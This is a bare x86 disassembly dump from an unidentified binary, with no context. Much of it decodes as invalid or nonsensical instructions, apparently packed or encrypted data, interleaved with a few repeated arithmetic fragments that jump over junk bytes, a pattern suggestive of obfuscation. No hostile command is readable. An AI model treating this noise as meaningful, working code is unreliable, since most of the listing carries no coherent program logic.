  413fc0:	mov    DWORD PTR [eax+ebp*8-0x60],eax
  413fc4:	jg     0x414027
  413fc6:	loop   0x413fa1
  413fc8:	xor    BYTE PTR ds:0x6e085497,bl
  413fce:	mov    dh,0x15
  413fd0:	into   
  413fd1:	inc    esi
  413fd2:	and    BYTE PTR [ebx],0x61
  413fd5:	cld    
  413fd6:	and    al,0x7b
  413fd8:	lds    esi,FWORD PTR [edx-0x18]
  413fdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fdc:	sbb    esp,DWORD PTR [ebp-0x2b3abcf7]
  413fe2:	adc    dh,BYTE PTR [edx-0x32dc28db]
  413fe8:	sub    BYTE PTR [ecx+0x78163b27],bh
  413fee:	jecxz  0x41401d
  413ff0:	or     BYTE PTR [edi+ebp*4],bl
  413ff3:	pop    ebx
  413ff4:	nop
  413ff5:	scas   al,BYTE PTR es:[edi]
  413ff6:	sub    ecx,DWORD PTR [edx-0x77]
  413ff9:	sti    
  413ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ffb:	sub    BYTE PTR [ecx-0x29db2472],ch
  414001:	popa   
  414002:	push   ss
  414003:	int    0xad
  414005:	pop    ebp
  414006:	inc    ebp
  414007:	lods   al,BYTE PTR ds:[esi]
  414008:	mov    DWORD PTR [edx+0x63],ecx
  41400b:	sbb    ah,BYTE PTR [ebp-0x5d]
  41400e:	cdq    
  41400f:	and    eax,0x62b5670f
  414014:	ins    DWORD PTR es:[edi],dx
  414015:	mov    esi,0x4c0f925b
  41401a:	mov    ebp,edi
  41401c:	dec    eax
  41401d:	cmp    edi,DWORD PTR [ebp-0x22873578]
  414023:	add    BYTE PTR [ecx+0x19eb8db0],bl
  414029:	cli    
  41402a:	inc    esi
  41402b:	dec    esi
  41402c:	(bad)  
  41402d:	pop    ebp
  41402e:	add    ecx,esi
  414030:	mul    dl
  414032:	dec    ebp
  414033:	call   FWORD PTR [ebp-0x73]
  414036:	mov    DWORD PTR [eax-0x6985b8c2],edx
  41403c:	adc    BYTE PTR [ebx-0x45bbcfec],ah
  414042:	(bad)  
  414043:	hlt    
  414044:	lods   al,BYTE PTR ds:[esi]
  414045:	fs xor ecx,edi
  414048:	jae    0x414044
  41404a:	ret    
  41404b:	cld    
  41404c:	gs pop esi
  41404e:	cmp    cl,ch
  414050:	shr    DWORD PTR [ebx+ecx*1],0x82
  414054:	dec    esi
  414055:	xchg   edi,eax
  414056:	mov    bh,0x79
  414058:	jne    0x41408b
  41405a:	das    
  41405b:	loopne 0x414096
  41405d:	jno    0x414088
  41405f:	add    ebx,esi
  414061:	ret    0x9efe
  414064:	and    ebp,edx
  414066:	pop    es
  414067:	arpl   WORD PTR [eax],bx
  414069:	pop    ss
  41406a:	mov    al,ds:0x808cbfe9
  41406f:	(bad)  
  414071:	jbe    0x4140e2
  414073:	call   0xf8455a3a
  414078:	dec    BYTE PTR [ebx+0x558b104d]
  41407e:	adc    al,0x33
  414080:	rol    cl,cl
  414082:	loope  0x4140a2
  414084:	mov    ecx,DWORD PTR [ebp+0x10]
  414087:	xor    eax,esi
  414089:	or     eax,edx
  41408b:	mov    edx,DWORD PTR [ebp+0x14]
  41408e:	shrd   ecx,edx,0x2
  414092:	shr    edx,0x2
  414095:	mov    edx,DWORD PTR [ebp+0x10]
  414098:	mov    ebx,DWORD PTR [ebp+0x14]
  41409b:	xor    ecx,esi
  41409d:	xor    ebx,ebx
  41409f:	or     ecx,ebx
  4140a1:	shl    edx,0x1e
  4140a4:	jmp    0x4143dd
  4140a9:	pop    eax
  4140aa:	add    eax,0xb29872c6
  4140af:	jl     0x4140dc
  4140b1:	fisttp DWORD PTR [ecx-0x3c8e5b7a]
  4140b7:	call   0xedbe:0xbe924be3
  4140be:	les    edi,FWORD PTR [esi+0x36e146be]
  4140c4:	xchg   edx,eax
  4140c5:	aam    0xdf
  4140c7:	fwait
  4140c8:	(bad)  
  4140c9:	data16 xor ch,BYTE PTR [edi-0x5b]
  4140cd:	ret    0x4d63
  4140d0:	and    al,0x5a
  4140d2:	bound  ebx,QWORD PTR [esi-0x2e4b8ea]
  4140d8:	adc    BYTE PTR [ebx],dh
  4140da:	xchg   ebx,eax
  4140db:	rcr    DWORD PTR [esi+ecx*8-0x16953ea2],1
  4140e2:	mov    dh,0xdc
  4140e4:	mov    ecx,?
  4140e6:	sub    DWORD PTR [edi-0x2355d487],eax
  4140ec:	dec    ebx
  4140ed:	aad    0x0
  4140ef:	aam    0x8
  4140f1:	clc    
  4140f2:	cdq    
  4140f3:	xor    cl,bh
  4140f5:	aas    
  4140f6:	push   0x933a40e2
  4140fb:	xchg   BYTE PTR [ebx],dh
  4140fd:	cld    
  4140fe:	aad    0x75
  414100:	das    
  414101:	mov    bp,0x91f9
  414105:	retf   0x6cb9
  414108:	jecxz  0x4140ad
  41410a:	and    al,0xa5
  41410c:	inc    esi
  41410d:	ffreep st(7)
  41410f:	pop    edx
  414110:	xor    edi,DWORD PTR [esi]
  414112:	loopne 0x4140a4
  414114:	sti    
  414115:	cmp    esp,DWORD PTR [ebp-0x55f0a45a]
  41411b:	jnp    0x4140bc
  41411d:	scas   eax,DWORD PTR es:[edi]
  41411e:	pop    ds
  41411f:	(bad)  
  414120:	xor    edi,DWORD PTR [eax-0x140e3e74]
  414126:	in     eax,dx
  414127:	sub    DWORD PTR ds:0x25d5a4c,ecx
  41412d:	xor    esp,DWORD PTR [esi+edi*2]
  414130:	push   ebp
  414131:	lods   eax,DWORD PTR ds:[esi]
  414132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414133:	out    0x30,al
  414135:	push   0xffffffb3
  414137:	add    BYTE PTR [edi-0x7060a156],bl
  41413d:	and    al,0x52
  41413f:	icebp  
  414140:	xor    ebp,esi
  414142:	mov    al,0x37
  414144:	sub    eax,0x999ad75c
  414149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41414a:	mov    bh,0x94
  41414c:	pop    ds
  41414d:	int    0x8c
  41414f:	outs   dx,DWORD PTR ds:[esi]
  414150:	dec    edi
  414151:	xchg   BYTE PTR [ecx],ch
  414153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414154:	fnsave [esi+ebx*1+0x46480bca]
  41415b:	or     edi,DWORD PTR [edi]
  41415d:	and    al,0xef
  41415f:	enter  0x37b4,0xde
  414163:	fs aam 0x31
  414166:	stos   BYTE PTR es:[edi],al
  414167:	or     al,0x79
  414169:	shr    DWORD PTR [edi],0xad
  41416c:	adc    ebp,ebp
  41416e:	mov    ah,0x7c
  414170:	imul   edi,DWORD PTR [edx+0x7b6acb18],0xc116a32f
  41417a:	pop    edi
  41417b:	es pop esi
  41417d:	push   edi
  41417e:	daa    
  41417f:	std    
  414180:	sbb    ecx,DWORD PTR [edx]
  414182:	retf   0x4c05
  414185:	(bad)  [eax-0x19bb51ef]
  41418b:	or     eax,0x885cf3f1
  414190:	xchg   ecx,eax
  414191:	push   eax
  414192:	mov    ebp,0x24e0e8cc
  414197:	pop    eax
  414198:	and    esi,ebx
  41419a:	xchg   esi,eax
  41419b:	aam    0x97
  41419d:	inc    eax
  41419e:	lock push es
  4141a0:	ror    DWORD PTR [edi+0x4d0cb4ad],1
  4141a6:	pop    ecx
  4141a7:	mul    eax
  4141a9:	push   esi
  4141aa:	pop    edx
  4141ab:	rcr    bh,cl
  4141ad:	sub    BYTE PTR [ebp+0x7f31249],0xa7
  4141b4:	nop
  4141b5:	pop    ecx
  4141b6:	pushf  
  4141b7:	mov    edi,0x81b487e
  4141bc:	lods   eax,DWORD PTR ds:[esi]
  4141bd:	stc    
  4141be:	xchg   esi,eax
  4141bf:	push   cs
  4141c0:	sbb    dh,ch
  4141c2:	dec    eax
  4141c3:	hlt    
  4141c4:	mov    bh,0x20
  4141c6:	or     eax,0x9af72c3c
  4141cb:	repz jmp 0x4141cd
  4141ce:	inc    edx
  4141cf:	dec    ecx
  4141d0:	int3   
  4141d1:	jb     0x41418d
  4141d3:	or     al,0x30
  4141d5:	xchg   ebp,eax
  4141d6:	ds add bh,BYTE PTR fs:[esi+0x15e20da2]
  4141de:	inc    ebp
  4141df:	xchg   esp,eax
  4141e0:	call   0xea13f250
  4141e5:	dec    esp
  4141e6:	test   ah,bl
  4141e8:	and    DWORD PTR [ebp-0x51fbac26],ebp
  4141ee:	iret   
  4141ef:	cmp    ah,BYTE PTR [edi+0x58ce00de]
  4141f5:	lahf   
  4141f6:	sar    DWORD PTR [esi+0x9932161],0xff
  4141fd:	out    0x21,al
  4141ff:	shl    BYTE PTR [esi-0x2c23cd67],0x5d
  414206:	push   es
  414207:	xchg   edi,eax
  414208:	arpl   bx,si
  41420a:	stos   DWORD PTR es:[edi],eax
  41420b:	dec    edi
  41420c:	fist   WORD PTR [ebx]
  41420e:	imul   ebp,DWORD PTR [ebx+eax*2+0x66],0xffffffa9
  414213:	xchg   edx,eax
  414214:	cmp    eax,0x81bdf6d5
  414219:	add    esi,ebx
  41421b:	push   edi
  41421c:	fisub  WORD PTR [edi+0x6777e280]
  414222:	loope  0x4141ac
  414224:	fimul  WORD PTR [ebp+0x9f855a2]
  41422a:	push   0x39f8f386
  41422f:	jl     0x41429e
  414231:	mov    dl,0x64
  414233:	cld    
  414234:	xchg   edx,eax
  414235:	outs   dx,BYTE PTR ds:[esi]
  414236:	gs push eax
  414238:	push   0x7009e49e
  41423d:	jno    0x41429a
  41423f:	imul   esi,edx,0xb
  414242:	mov    eax,DWORD PTR [ebp+0x33]
  414245:	arpl   WORD PTR [ebx-0x63],bp
  414248:	shl    dl,1
  41424a:	inc    edx
  41424b:	shl    BYTE PTR [ebx],1
  41424d:	mov    ah,0x48
  41424f:	sub    esi,DWORD PTR [eax+0x79]
  414252:	push   ss
  414253:	pushf  
  414254:	pop    ebx
  414255:	sub    BYTE PTR [ebx+0x360af612],dh
  41425b:	fistp  QWORD PTR [ebx-0x1f]
  41425e:	out    dx,al
  41425f:	gs pop edx
  414261:	dec    esi
  414262:	pop    esi
  414263:	xchg   ebp,eax
  414264:	test   al,0x20
  414266:	cmp    eax,DWORD PTR [eax-0x3a]
  414269:	loop   0x4141f3
  41426b:	jnp    0x4142df
  41426d:	jmp    0x9851:0xa7626d1b
  414274:	or     al,0x6b
  414276:	(bad)  
  414277:	repz mov dh,0x33
  41427a:	test   BYTE PTR [edx],bl
  41427c:	std    
  41427d:	(bad)  
  41427e:	sahf   
  41427f:	mov    cl,0x70
  414281:	(bad)  
  414282:	aas    
  414283:	idiv   DWORD PTR [ebx]
  414285:	dec    edi
  414286:	and    DWORD PTR [ebp-0x14492ea1],edi
  41428c:	jae    0x414294
  41428e:	das    
  41428f:	dec    esi
  414290:	dec    edi
  414291:	inc    esi
  414292:	mov    al,0x24
  414294:	push   ebp
  414295:	sbb    al,0x10
  414297:	xchg   ebx,eax
  414298:	pop    esi
  414299:	lea    edx,[ecx]
  41429b:	sub    eax,0xedd3a8db
  4142a0:	test   al,0xf1
  4142a2:	aaa    
  4142a3:	repz and al,0x87
  4142a6:	in     eax,dx
  4142a7:	out    0x63,eax
  4142a9:	mov    esp,0x3a0544
  4142ae:	fldcw  WORD PTR [esi+0x5a]
  4142b1:	loope  0x414237
  4142b3:	mov    ebp,0x71af1320
  4142b8:	cwde   
  4142b9:	repnz lock aam 0x8f
  4142bd:	fcom   DWORD PTR [edi+0x48a3153d]
  4142c3:	xchg   edi,eax
  4142c4:	arpl   WORD PTR [ecx-0x2c],bp
  4142c7:	ficom  WORD PTR [ecx]
  4142c9:	rcl    BYTE PTR [ecx],0xd5
  4142cc:	fwait
  4142cd:	pop    ebp
  4142ce:	cwde   
  4142cf:	fbld   TBYTE PTR [esi+0x14]
  4142d2:	ja     0x414299
  4142d4:	retf   0xfd05
  4142d7:	add    ebp,DWORD PTR [edx+0x12e5870e]
  4142dd:	dec    esp
  4142de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142df:	xor    BYTE PTR [eax+0x3e],ah
  4142e2:	fwait
  4142e3:	and    al,0x32
  4142e5:	hlt    
  4142e6:	enter  0xe34e,0xd6
  4142ea:	adc    ebx,esp
  4142ec:	rcl    BYTE PTR [esi+0x22],0x8c
  4142f0:	jno    0x414321
  4142f2:	xor    dl,bh
  4142f4:	fwait
  4142f5:	xchg   edx,eax
  4142f6:	ror    DWORD PTR [ecx-0x383dc214],0x50
  4142fd:	sub    eax,0xb49120ce
  414302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414303:	daa    
  414304:	mov    ch,0xeb
  414306:	xchg   ebx,eax
  414307:	lahf   
  414308:	jle    0x414338
  41430a:	pop    eax
  41430b:	inc    edi
  41430c:	pop    esp
  41430d:	pop    ss
  41430e:	loop   0x414319
  414310:	or     BYTE PTR [eax],dh
  414312:	pop    ecx
  414313:	dec    esi
  414314:	sbb    eax,0x6d5b4cf1
  414319:	xchg   esi,eax
  41431a:	ja     0x41429f
  41431c:	jecxz  0x4142fd
  41431e:	loopne 0x4142a2
  414320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414321:	push   esp
  414322:	adc    bh,BYTE PTR [edx]
  414324:	ins    BYTE PTR es:[edi],dx
  414325:	cmp    eax,DWORD PTR [eax-0x42778d7c]
  41432b:	lods   al,BYTE PTR ds:[esi]
  41432c:	jbe    0x414327
  41432e:	retf   0x3ddc
  414331:	mov    cl,0x28
  414333:	pusha  
  414334:	rol    DWORD PTR [ecx+edx*8],0x27
  414338:	aas    
  414339:	or     al,BYTE PTR [eax+0x2d58137a]
  41433f:	outs   dx,DWORD PTR ds:[esi]
  414340:	xchg   edi,eax
  414341:	or     BYTE PTR [edi+ebp*8],dh
  414344:	xor    ah,BYTE PTR [ecx+edx*2-0x36]
  414348:	inc    ebx
  414349:	jns    0x4142d1
  41434b:	leave  
  41434c:	inc    ebp
  41434d:	(bad)  
  41434e:	gs mov bh,0xab
  414351:	adc    ch,BYTE PTR [ebx]
  414353:	aas    
  414354:	sub    DWORD PTR [ecx-0x7a5d9221],esp
  41435a:	or     BYTE PTR [edx+0x7d],al
  41435d:	jb     0x414328
  41435f:	mov    al,0x35
  414361:	cli    
  414362:	clc    
  414363:	shl    DWORD PTR [edx+0x7d96f1cf],1
  414369:	jmp    0x9375fd19
  41436e:	jnp    0x41432d
  414370:	cld    
  414371:	mov    edi,0x7a82536
  414376:	neg    BYTE PTR [ebx]
  414378:	inc    edx
  414379:	cmp    cl,BYTE PTR [ecx]
  41437b:	xor    esp,esp
  41437d:	adc    eax,0x668b93f8
  414382:	jmp    0x1070:0x4718ae8f
  414389:	scas   al,BYTE PTR es:[edi]
  41438a:	push   0xc2e768ae
  41438f:	inc    ecx
  414390:	mov    bh,0x47
  414392:	scas   al,BYTE PTR es:[edi]
  414393:	sub    eax,0x6a6c03b9
  414398:	(bad)  
  414399:	pop    ds
  41439a:	std    
  41439b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41439c:	(bad)  
  41439d:	cs lock jl 0x414409
  4143a1:	push   esp
  4143a2:	jbe    0x41439a
  4143a4:	in     eax,dx
  4143a5:	stos   DWORD PTR es:[edi],eax
  4143a6:	in     al,0x61
  4143a8:	xchg   BYTE PTR [edi-0x8d8e375],dh
  4143ae:	xor    al,0x91
  4143b0:	mov    ecx,0x3e177bd
  4143b5:	(bad)  
  4143b6:	push   ds
  4143b7:	inc    ecx
  4143b8:	or     bl,al
  4143ba:	xor    BYTE PTR [ebx+ebp*8-0x5a],0xee
  4143bf:	loopne 0x414436
  4143c1:	push   ebx
  4143c2:	sub    BYTE PTR [ecx+eax*8-0x31],dh
  4143c6:	pushw  0x36f9
  4143ca:	jne    0x414438
  4143cc:	test   al,0x74
  4143ce:	imul   ebx,DWORD PTR [edx-0x70],0x55b2aa68
  4143d5:	lahf   
  4143d6:	mov    dh,0xd9
  4143d8:	mov    ch,0xa3
  4143da:	push   0xc1036a7b
  4143df:	mov    ecx,DWORD PTR [ebp+0x10]
  4143e2:	mov    edx,DWORD PTR [ebp+0x14]
  4143e5:	shrd   ecx,edx,0x2
  4143e9:	shr    edx,0x2
  4143ec:	xor    ecx,esi
  4143ee:	jmp    0x414727
  4143f3:	cmp    eax,0xb8c710f5
  4143f8:	sub    BYTE PTR [ebp+0x76acc878],dl
  4143fe:	xchg   edx,eax
  4143ff:	sbb    ah,BYTE PTR [esi+ecx*1-0x62]
  414403:	jnp    0x41439d
  414405:	mov    esi,0xbec4edbe
  41440a:	mov    esi,0x8b0860e8
  41440f:	inc    ebp
  414410:	in     eax,0x50
  414412:	not    BYTE PTR [eax+eiz*8]
  414415:	mov    ds:0xd2fe38e7,eax
  41441a:	adc    eax,0xf5d51a5b
  41441f:	mov    ds:0xf428f591,eax
  414424:	(bad)  
  414425:	mov    eax,0x3c5dddcd
  41442a:	and    edx,DWORD PTR [edi]
  41442c:	repnz mov ebx,DWORD PTR [ebx+0x3848dd47]
  414433:	sbb    dl,BYTE PTR [ebp+0x702c5ab9]
  414439:	mov    esi,0x44d08799
  41443e:	mov    ecx,0xf7c033d0
  414443:	aas    
  414444:	inc    ebx
  414445:	fisubr WORD PTR [ebx+0x10de835f]
  41444b:	cmp    BYTE PTR [ebx],ch
  41444d:	cmp    al,0x36
  41444f:	pop    edi
  414450:	mov    WORD PTR [ebx],?
  414452:	sahf   
  414453:	jne    0x4144bb
  414455:	and    DWORD PTR [edx],esp
  414457:	in     eax,dx
  414458:	in     eax,0x6c
  41445a:	xlat   BYTE PTR ds:[ebx]
  41445b:	scas   al,BYTE PTR es:[edi]
  41445c:	or     BYTE PTR [ebx+0x156555eb],0xcb
  414463:	inc    DWORD PTR [edi-0x5]
  414466:	push   ecx
  414467:	sub    DWORD PTR [ebx+eiz*8-0x21],ecx
  41446b:	mov    ah,0xb0
  41446d:	pop    ebp
  41446e:	cmp    esp,edx
  414470:	dec    esi
  414471:	fild   DWORD PTR ds:0x9d0d0813
  414477:	jno    0x4144a6
  414479:	adc    DWORD PTR [eax+eiz*1+0x5c],ebx
  41447d:	ss pop esp
  41447f:	xcrypt-ctr (bad)
  414480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414481:	fistp  QWORD PTR [ecx-0x50]
  414484:	(bad)  
  414485:	fdivrp st(7),st
  414487:	lahf   
  414488:	fiadd  DWORD PTR gs:[ecx+0x3ee20e31]
  41448f:	stc    
  414490:	aaa    
  414491:	inc    edi
  414492:	pusha  
  414493:	or     eax,0x3b4cde37
  414498:	jbe    0x414426
  41449a:	fistp  DWORD PTR [eax-0x5c]
  41449d:	mov    esi,0x988417fe
  4144a2:	sbb    BYTE PTR [ebx],ch
  4144a4:	jo     0x41445b
  4144a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144a8:	jo     0x414523
  4144aa:	aam    0xd2
  4144ac:	mov    al,0x18
  4144ae:	cmc    
  4144af:	data16 loopne 0x4144a1
  4144b2:	in     eax,0x7a
  4144b4:	daa    
  4144b5:	mov    ecx,0x4d190f7f
  4144ba:	mov    dh,bh
  4144bc:	push   ebp
  4144bd:	push   edx
  4144be:	out    0x66,al
  4144c0:	mov    al,0x89
  4144c2:	push   eax
  4144c3:	sbb    DWORD PTR ds:0xdb29bb0b,esp
  4144c9:	adc    eax,0x1291418
  4144ce:	lods   al,BYTE PTR ds:[esi]
  4144cf:	mov    BYTE PTR [ecx+0x32dd7baa],dl
  4144d5:	inc    edi
  4144d6:	test   DWORD PTR [edx-0x3adee0f2],eax
  4144dc:	sub    cl,BYTE PTR [eax-0x7c3ecaeb]
  4144e2:	lods   eax,DWORD PTR ds:[esi]
  4144e3:	pop    esp
  4144e4:	pop    edx
  4144e5:	rol    BYTE PTR [esi],1
  4144e7:	mov    bl,0xd1
  4144e9:	lahf   
  4144ea:	push   eax
  4144eb:	rcr    BYTE PTR [eax+0x7aba65fc],cl
  4144f1:	iret   
  4144f2:	imul   esi,DWORD PTR [ebp-0x787ca33f],0x2f98c389
  4144fc:	add    cl,BYTE PTR [edx-0x1411bc71]
  414502:	loop   0x414561
  414504:	mov    eax,0xdb35a6e
  414509:	pop    edi
  41450a:	xchg   esp,eax
  41450b:	ret    0xded5
  41450e:	(bad)  
  41450f:	(bad)  
  414510:	adc    bl,dh
  414512:	fwait
  414513:	mov    edi,0x59b439eb
  414518:	and    edi,DWORD PTR [esi+0x21]
  41451b:	cmp    cl,bl
  41451d:	sub    BYTE PTR [ebp-0x10],0x67
  414521:	outs   dx,BYTE PTR ds:[esi]
  414522:	sbb    ah,BYTE PTR [ecx-0x22]
  414525:	jnp    0x41454a
  414527:	mov    esi,0x3dd8c172
  41452c:	cwde   
  41452d:	or     esp,ebp
  41452f:	nop
  414530:	sbb    al,0x32
  414532:	mov    ds:0x993e57bf,al
  414537:	cmp    eax,0xb2273da3
  41453c:	ror    DWORD PTR [eax+0x1d],1
  41453f:	lds    edi,FWORD PTR [ecx-0xe]
  414542:	outs   dx,BYTE PTR ds:[esi]
  414543:	scas   al,BYTE PTR es:[edi]
  414544:	dec    ecx
  414545:	pop    ebp
  414546:	inc    BYTE PTR [edi]
  414548:	(bad)  
  414549:	repnz scas eax,DWORD PTR es:[edi]
  41454b:	and    bl,BYTE PTR [edx-0x36]
  41454e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41454f:	push   edi
  414550:	xlat   BYTE PTR ds:[ebx]
  414551:	ins    DWORD PTR es:[edi],dx
  414552:	cmp    esi,DWORD PTR [esi+0x45]
  414555:	push   ecx
  414556:	clc    
  414557:	(bad)  
  414558:	pop    edi
  414559:	fsub   st,st(2)
  41455b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41455c:	fsubrp st(1),st
  41455e:	or     al,0x35
  414560:	out    dx,eax
  414561:	push   ds
  414562:	sbb    al,0xcd
  414564:	jbe    0x414565
  414566:	pop    edx
  414567:	or     al,0x94
  414569:	xchg   esi,eax
  41456a:	mov    eax,0x6dca4ee7
  41456f:	jl     0x4145c5
  414571:	add    al,0xd0
  414573:	inc    ebp
  414574:	lds    ebx,FWORD PTR [eax+0x68]
  414577:	push   ds
  414578:	rcl    DWORD PTR [esp+eax*4-0x13],1
  41457c:	and    esp,DWORD PTR [edx+esi*1+0xd]
  414580:	idiv   DWORD PTR [ebx-0x6b765078]
  414586:	not    esi
  414588:	mov    BYTE PTR [esi+0x3],0x8
  41458c:	pop    ebx
  41458d:	adc    DWORD PTR [esi-0x23],ebp
  414590:	mov    al,0x16
  414592:	jl     0x414567
  414594:	xor    al,0x16
  414596:	outs   dx,BYTE PTR ds:[esi]
  414597:	pop    ecx
  414598:	shl    al,cl
  41459a:	iret   
  41459b:	cwde   
  41459c:	sub    eax,0x538c119
  4145a1:	xchg   BYTE PTR [esi+0x401f68a1],ah
  4145a7:	pop    edx
  4145a8:	cmc    
  4145a9:	dec    edi
  4145aa:	add    bh,BYTE PTR [ebp+edx*8+0x5db57ab2]
  4145b1:	test   DWORD PTR [eax+0x5a5b0d5a],ebp
  4145b7:	cmp    ah,BYTE PTR [ebp-0x2]
  4145ba:	mov    esp,0xb7cf6be1
  4145bf:	fucomi st,st(5)
  4145c1:	push   0xffffffe6
  4145c3:	(bad)  
  4145c4:	lea    ebp,[eax]
  4145c6:	adc    BYTE PTR [eax],dh
  4145c8:	rol    ecx,cl
  4145ca:	stos   DWORD PTR es:[edi],eax
  4145cb:	xchg   esi,eax
  4145cc:	mov    ch,0x4f
  4145ce:	mov    bh,0xdc
  4145d0:	cmp    esp,DWORD PTR [ebx]
  4145d2:	push   0x4edc53d2
  4145d7:	lods   al,BYTE PTR ds:[esi]
  4145d8:	or     eax,0x7dae877d
  4145dd:	cmp    dh,BYTE PTR [ebx+esi*8-0x7d14673]
  4145e4:	sub    esp,ebx
  4145e6:	test   bl,dh
  4145e8:	fs jb  0x414607
  4145eb:	add    ebp,DWORD PTR [edx-0x6a]
  4145ee:	add    dh,BYTE PTR [esi]
  4145f0:	mov    bl,0x89
  4145f2:	sbb    dh,BYTE PTR [esi-0xf]
  4145f5:	popf   
  4145f6:	and    DWORD PTR [ecx],edi
  4145f8:	mov    WORD PTR [edx+0x1a9b744],?
  4145fe:	adc    esi,DWORD PTR [edi]
  414600:	mov    ebx,0xb1dd068d
  414605:	jp     0x4145d8
  414607:	xchg   ebp,eax
  414608:	pop    esi
  414609:	or     DWORD PTR [esi],ebp
  41460b:	cmp    DWORD PTR [edi+0x7f394069],0xaaa4233b
  414615:	xor    eax,0x610afccd
  41461a:	in     al,dx
  41461b:	push   0x2c
  41461d:	bound  ebp,QWORD PTR [esi+0x73589b2a]
  414623:	loope  0x41464d
  414625:	inc    edi
  414626:	sub    DWORD PTR [ebp+0x4c],ebp
  414629:	xchg   esi,eax
  41462a:	pop    ss
  41462b:	push   ebx
  41462c:	push   ebp
  41462d:	out    dx,eax
  41462e:	push   esp
  41462f:	les    esi,FWORD PTR [esi+0x4b]
  414632:	fcom   QWORD PTR [ebx+0x65]
  414635:	std    
  414636:	mov    al,0xdf
  414638:	not    DWORD PTR [ebx+0xa14bf6f]
  41463e:	retf   
  41463f:	mov    cl,ch
  414641:	jmp    0xe817:0xde3ca03e
  414648:	icebp  
  414649:	mov    ch,BYTE PTR [edi-0x1797a069]
  41464f:	cdq    
  414650:	push   edx
  414651:	pop    ecx
  414652:	xchg   ecx,eax
  414653:	daa    
  414654:	mov    eax,ds:0xab635780
  414659:	xor    bh,dh
  41465b:	ret    0xd0a6
  41465e:	mov    al,0x7f
  414660:	mov    cl,0xbb
  414662:	mov    BYTE PTR [eax+ecx*2-0x3d793b0e],bl
  414669:	out    0xab,al
  41466b:	mov    WORD PTR [esi+0x3e],fs
  41466e:	jae    0x4146b7
  414670:	dec    ebx
  414671:	test   DWORD PTR [edi+0x2b],eax
  414674:	xchg   ebp,eax
  414675:	rcr    bh,0xe5
  414678:	mov    bh,0xd8
  41467a:	or     eax,0x3d254f19
  41467f:	(bad)  
  414680:	mov    edx,0xeb5d8ad3
  414685:	loop   0x4146c1
  414687:	out    0x81,eax
  414689:	fisttp DWORD PTR [edi+0x12]
  41468c:	lock xchg BYTE PTR [ecx-0x54ebc805],dh
  414693:	and    DWORD PTR [edx],esi
  414695:	inc    ebx
  414696:	les    edi,FWORD PTR ds:0xf6e631b2
  41469c:	test   DWORD PTR [edx-0x4],ebx
  41469f:	mov    ecx,0x7092ab42
  4146a4:	mov    ebp,0x916e79e3
  4146a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146aa:	mov    ebp,0xcd4c2bd2
  4146af:	sbb    DWORD PTR [edi+0x85e7449],edx
  4146b5:	cmp    al,0xd9
  4146b7:	jns    0x41465e
  4146b9:	mov    WORD PTR [ebx+0x77],?
  4146bc:	dec    esp
  4146bd:	mov    BYTE PTR [eax-0x2513790b],dh
  4146c3:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146c6:	fs fwait
  4146c8:	pop    esp
  4146c9:	clc    
  4146ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146cb:	mov    bl,0xe7
  4146cd:	out    dx,eax
  4146ce:	mov    al,ah
  4146d0:	cs pop ss
  4146d2:	xor    ebx,DWORD PTR [edx+0x4b]
  4146d5:	mov    cl,al
  4146d7:	ret    
  4146d8:	jg     0x4146b7
  4146da:	pop    ecx
  4146db:	fcom   DWORD PTR [ebx]
  4146dd:	cdq    
  4146de:	cmp    ecx,esp
  4146e0:	div    BYTE PTR [ecx-0x23]
  4146e3:	or     al,BYTE PTR [ebp+0x5e]
  4146e6:	dec    edi
  4146e7:	ror    DWORD PTR [edx+0x53],cl
  4146ea:	out    dx,eax
  4146eb:	add    dh,bh
  4146ed:	adc    bl,BYTE PTR [edi-0x45be46fd]
  4146f3:	sub    al,0xe9
  4146f5:	mov    dh,dh
  4146f7:	push   edx
  4146f8:	fldenv [edx]
  4146fa:	jp     0x4146dd
  4146fc:	mov    eax,ds:0x153cf7ba
  414701:	cmp    ch,bl
  414703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414704:	xlat   BYTE PTR ds:[ebx]
  414705:	or     eax,ebx
  414707:	sbb    ebp,0x8b1baed0
  41470d:	das    
  41470e:	sbb    edx,DWORD PTR [eax]
  414710:	cmp    BYTE PTR [ebx+0x9],dh
  414713:	mov    gs,WORD PTR [eax]
  414715:	and    DWORD PTR [ebx+edx*1-0x1912ac3b],0x2
  41471d:	dec    ecx
  41471e:	and    edx,0xffffffce
  414721:	daa    
  414722:	mov    es,ecx
  414724:	sbb    esp,esi
  414726:	ror    BYTE PTR [ebx+0x5d8b1055],cl
  41472c:	adc    al,0x33
  41472e:	fisttp DWORD PTR [ebx]
  414730:	retf   
  414731:	add    eax,ecx
  414733:	lea    eax,[ebp+eax*4-0x7c]
  414737:	push   eax
  414738:	shl    edx,0x1e
  41473b:	call   0x411c08
  414740:	mov    eax,DWORD PTR [ebp-0x80]
  414743:	mov    ecx,DWORD PTR [ebp-0x80]
  414746:	xor    eax,edi
  414748:	xor    ecx,0xfffffffe
  41474b:	shr    eax,0x2
  41474e:	shl    ecx,0x1e
  414751:	or     ecx,eax
  414753:	mov    DWORD PTR [ebp-0x80],ecx
  414756:	lea    eax,[ebp-0x80]
  414759:	push   eax
  41475a:	mov    eax,DWORD PTR [ebp+0x10]
  41475d:	mov    ecx,DWORD PTR [ebp+0x14]
  414760:	shrd   eax,ecx,0x2
  414764:	shr    ecx,0x2
  414767:	mov    ecx,DWORD PTR [ebp+0x10]
  41476a:	mov    edx,DWORD PTR [ebp+0x14]
  41476d:	xor    eax,esi
  41476f:	xor    edx,edx
